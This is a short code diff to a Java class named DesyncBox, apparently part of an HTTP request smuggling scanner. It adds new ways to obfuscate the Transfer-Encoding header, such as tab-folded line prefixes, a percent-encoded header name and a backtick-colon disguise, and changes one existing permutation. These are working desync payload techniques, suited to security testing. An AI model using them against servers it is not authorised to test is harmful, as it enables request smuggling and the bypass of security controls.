@@ -71,6 +71,9 @@ public class DesyncBox {
             case "nameprefix1":
                 permuted = "Foo: bar\r\n " + header;
                 break;
+            case "nameprefix2":
+                permuted = "Foo: bar\r\n\t" + header;
+                break;
             case "valueprefix1":
                 permuted = header + " ";
                 break;
@@ -93,7 +96,7 @@ public class DesyncBox {
                 permuted = header + "\n\u000B";
                 break;
             case "tabwrap":
-                permuted = header + "\n\t";
+                permuted = header + "\r\n\t";
                 break;
             case "multiCase":
                 permuted = header.toUpperCase();
@@ -195,6 +198,10 @@ public class DesyncBox {
                 transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity, chunked, identity");
             } else if (technique.equals("http2hide")) {
                 transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Foo: b^~Transfer-Encoding: chunked^~x: x");
+            } else if (technique.equals("encode")) {
+                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked");
+            } else if (technique.equals("h2colon")) {
+                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding`chunked : chunked");
             }
 
 
